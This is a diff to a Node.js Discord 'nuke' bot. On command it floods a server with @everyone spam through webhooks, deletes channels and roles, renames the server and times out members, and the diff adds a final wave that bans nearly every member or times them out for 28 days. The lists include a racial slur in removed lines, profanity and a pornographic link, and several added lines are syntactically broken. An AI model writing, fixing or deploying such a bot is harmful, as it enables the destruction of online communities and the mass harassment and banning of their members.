@@ -17,10 +17,13 @@ const TOKEN = process.env.TOKEN;
 const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
 const PROTECTED_CHANNEL = 'aaaaaaaa';
 
-const NUKE_DURATION = 10 * 60 * 1000;
-const TICK_INTERVAL = 5 * 10; // aggressive speed
-let nukeActive = true;
-let nukeTimeout = false;
+const NUKE_DURATION = 5 * 60 * 1000;   // 5 minutes of chaos
+const TICK_INTERVAL = 5 * 1000;        // every 5 seconds
+const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000; // ~28 days
+
+let nukeActive = false;
+let nukeInterval = null;
+let nukeTimeout = null;
 
 // ================== GIF SLOTS ==================
 const GIF_TYPE_1 = [
@@ -29,6 +32,8 @@ const GIF_TYPE_1 = [
 
 const GIF_TYPE_2 = [
   "https://klipy.com/gifs/vegan-porn-carrot-porn"
+   `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
+  `@everyone`,
 ];
 
 // ================== LISTS ==================
@@ -37,7 +42,7 @@ const SERVER_NAMES = [
   'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
   'REALITY BROKEN', 'CHAOS OVERLOAD', 'TOTAL COLLAPSE', 'FINAL STAGE',
   'NO ESCAPE', 'WEBHOOK ARMY', 'ARMY ONLINE', 'BOSS RAGE', 'FULL AGGRO',
-  'MULTI TASK', 'PARALLEL CHAOS', 'AGGRESSIVE MODE'
+  'MULTI TASK', 'PARALLEL CHAOS', 'AGGRESSIVE MODE', '5 MIN NUKE'
 ];
 
 const CHANNEL_NAMES = [
@@ -46,14 +51,14 @@ const CHANNEL_NAMES = [
   'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
   'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
   'minion-spam', 'boss-room', 'collapse', 'broken', 'army', 'flood', 'wave',
-  'aggro', 'rage', 'kill', 'multi', 'parallel', 'pressure'
+  'aggro', 'rage', 'kill', 'multi', 'parallel', 'pressure', 'ban-wave'
 ];
 
 const NICKNAMES = [
   'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
   'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
   'SILENCED', 'BROKEN', 'ARMY TARGET', 'WEBHOOK VICTIM', 'BOSS TARGET',
-  'RAGE VICTIM', 'AGGRO', 'MULTI VICTIM', 'PRESSURED'
+  'RAGE VICTIM', 'AGGRO', 'MULTI VICTIM', 'PRESSURED', 'BANNED SOON'
 ];
 
 const ROLE_NAMES = [
@@ -63,20 +68,19 @@ const ROLE_NAMES = [
 ];
 
 const MESSAGES = [
- 
-  
-  
   `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
-  `@everyone`,
+  `@everyone`,'
 ];
 
 const ARMY_NAMES = [
-"NIGGER","FUCKASS"
+  'Minion', 'Army-1', 'Army-2', 'Flood', 'Screamer', 'Null', 'Hunter',
+  'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos', 'Destroyer',
+  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord', 'Rage', 'Aggro'
 ];
 
 const ARMY_MESSAGES = [
+  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
  `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
-  `@everyone`, `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
   `@everyone`,
 ];
 
@@ -108,10 +112,54 @@ async function getOrCreateWebhook(channel, name = 'Minion') {
 
 async function safeDelete(channel) {
   if (!channel || channel.name === PROTECTED_CHANNEL) return;
-  await channel.delete('AGGRESSIVE MULTI-TASK').catch(() => {});
+  await channel.delete('5 MIN NUKE').catch(() => {});
 }
 
-// ================== BOSS ACTIONS (Aggressive) ==================
+// ================== FINAL BAN + TIMEOUT WAVE ==================
+async function finalBanWave(guild) {
+  console.log('🔪 FINAL BAN WAVE STARTING...');
+
+  const members = await guild.members.fetch().catch(() => null);
+  if (!members) {
+    console.log('❌ Could not fetch members for ban wave');
+    return;
+  }
+
+  let banned = 0;
+  let timedOut = 0;
+  let failed = 0;
+
+  const tasks = [...members.values()].map(async (member) => {
+    if (member.user.bot) return;
+    if (member.id === guild.ownerId) return; // never ban the owner
+
+    // Try to ban first
+    try {
+      if (member.bannable) {
+        await member.ban({ reason: '5 MIN NUKE - FINAL WAVE' });
+        banned++;
+        return;
+      }
+    } catch (e) {}
+
+    // If ban failed, try long timeout
+    try {
+      if (member.moderatable) {
+        await member.timeout(FINAL_TIMEOUT, '5 MIN NUKE - FALLBACK TIMEOUT');
+        timedOut++;
+        return;
+      }
+    } catch (e) {}
+
+    failed++;
+  });
+
+  await Promise.all(tasks);
+
+  console.log(`✅ FINAL WAVE DONE → Banned: ${banned} | Timed out: ${timedOut} | Failed: ${failed}`);
+}
+
+// ================== BOSS ACTIONS ==================
 const bossActions = [
   async (guild) => {
     await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
@@ -156,7 +204,7 @@ const bossActions = [
     await Promise.all(
       roles
         .filter(r => r.id !== guild.id && r.editable)
-        .map(r => r.delete('AGGRESSIVE MULTI-TASK').catch(() => {}))
+        .map(r => r.delete('5 MIN NUKE').catch(() => {}))
     );
   },
 
@@ -167,7 +215,7 @@ const bossActions = [
         guild.roles.create({
           name: randomItem(ROLE_NAMES),
           color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
-          reason: 'AGGRESSIVE MULTI-TASK',
+          reason: '5 MIN NUKE',
         }).catch(() => {})
       );
     }
@@ -192,7 +240,7 @@ const bossActions = [
         .filter(m => !m.user.bot && m.moderatable)
         .map(m => {
           const time = [900, 1800, 3600, 7200, 14400][Math.floor(Math.random() * 5)] * 1000;
-          return m.timeout(time, 'AGGRESSIVE MULTI-TASK').catch(() => {});
+          return m.timeout(time, '5 MIN NUKE').catch(() => {});
         })
     );
   },
@@ -230,7 +278,7 @@ const bossActions = [
 
   async (guild) => {
     await guild.members.me.setNickname(randomItem([
-      'AGGRESSIVE MULTI-TASK', 'PARALLEL CHAOS', 'BOSS RAGE',
+      '5 MIN NUKE', 'PARALLEL CHAOS', 'BOSS RAGE',
       'ARMY COMMANDER', 'OVERLORD', 'THE DESTROYER', 'FULL AGGRO'
     ])).catch(() => {});
   },
@@ -251,7 +299,7 @@ const bossActions = [
   },
 ];
 
-// ================== WEBHOOK ARMY (Aggressive + Parallel) ==================
+// ================== WEBHOOK ARMY ==================
 const armyActions = [
   async (guild) => {
     const channels = guild.channels.cache.filter(c =>
@@ -276,7 +324,6 @@ const armyActions = [
       }
     }
     await Promise.all(tasks);
-    console.log('👾 AGGRESSIVE ARMY GIF WAVE');
   },
 
   async (guild) => {
@@ -307,7 +354,7 @@ const armyActions = [
       tasks.push((async () => {
         try {
           const ch = await guild.channels.create({
-            name: randomItem(['army-spam', 'multi-wave', 'flood-zone', 'aggro', 'parallel']),
+            name: randomItem(["EZ"]),
             type: ChannelType.GuildText,
           });
           for (const name of ARMY_NAMES.slice(0, 4)) {
@@ -333,8 +380,8 @@ const armyActions = [
         const webhook = await getOrCreateWebhook(channel, 'Glitch');
         if (!webhook) return;
         await webhook.send({
-          content: randomItem([ `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
-  `@everyone`,]),
+          content: randomItem( `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
+  `@everyone`,']),
           username: randomItem([ `@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
   `@everyone`,]),
         }).catch(() => {});
@@ -344,57 +391,63 @@ const armyActions = [
   },
 ];
 
-// ================== MULTI-TASK TICK ==================
+// ================== TICK ==================
 async function runNukeTick(guild) {
   if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
     console.log('⚠️ Missing Administrator permission');
     return;
   }
 
-  console.log(`\n======== AGGRESSIVE MULTI-TASK TICK on ${guild.name} ========`);
+  console.log(`\n======== 5 MIN NUKE TICK on ${guild.name} ========`);
 
   const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, 9);
   const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, 4);
 
-  // Everything runs at the same time
   await Promise.all([
     ...selectedBoss.map(action => action(guild).catch(err => console.error('❌ Boss:', err.message))),
     ...selectedArmy.map(action => action(guild).catch(err => console.error('❌ Army:', err.message))),
   ]);
 
-  console.log('✅ Aggressive multi-task tick complete');
+  console.log('✅ Tick complete');
 }
 
 // ================== START / STOP ==================
 async function startNuke(guild, message) {
   if (nukeActive) {
-    if (message) await message.reply('FUCK YEA IM STILL RUNNING');
-    
+    if (message) await message.reply('⚠️ Nuke is already running.');
+    return;
   }
 
   nukeActive = true;
-  if (message) await message.reply('💣 **AGGRESSIVE MULTI-TASK NUKE STARTED**\nBoss + Armies hitting in parallel.');
+  if (message) {
+    await message.reply('💣 **5 MINUTE NUKE STARTED**\nAfter 5 minutes → Ban wave + long timeouts.');
+  }
 
-  console.log('💣 AGGRESSIVE MULTI-TASK NUKE STARTED');
+  console.log('💣 5 MINUTE NUKE STARTED');
 
   await runNukeTick(guild);
 
-  const interval = setInterval(async () => {
-    if (!nukeActive) return clearInterval(interval);
+  nukeInterval = setInterval(async () => {
+    if (!nukeActive) return clearInterval(nukeInterval);
     await runNukeTick(guild);
   }, TICK_INTERVAL);
 
-  nukeTimeout = setTimeout(() => {
+  // After 5 minutes → final ban/timeout wave
+  nukeTimeout = setTimeout(async () => {
     nukeActive = false;
-    clearInterval(interval);
-    console.log('🛑 AGGRESSIVE MULTI-TASK NUKE ENDED');
+    clearInterval(nukeInterval);
+
+    console.log('⏰ 5 MINUTES OVER → STARTING FINAL BAN WAVE');
+    await finalBanWave(guild);
+
+    console.log('🛑 5 MINUTE NUKE FULLY ENDED');
   }, NUKE_DURATION);
 }
 
 // ================== EVENTS ==================
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
-  console.log(`💣 AGGRESSIVE MULTI-TASK NUKE BOT READY`);
+  console.log(`💣 5 MIN NUKE + FINAL BAN WAVE BOT READY`);
 });
 
 client.on('messageCreate', async (message) => {
@@ -407,8 +460,9 @@ client.on('messageCreate', async (message) => {
 
   if (message.content === '!nuke-stop') {
     nukeActive = false;
+    if (nukeInterval) clearInterval(nukeInterval);
     if (nukeTimeout) clearTimeout(nukeTimeout);
-    await message.reply('🛑 Nuke stopped.');
+    await message.reply('🛑 Nuke stopped early (no ban wave).');
   }
 });
 
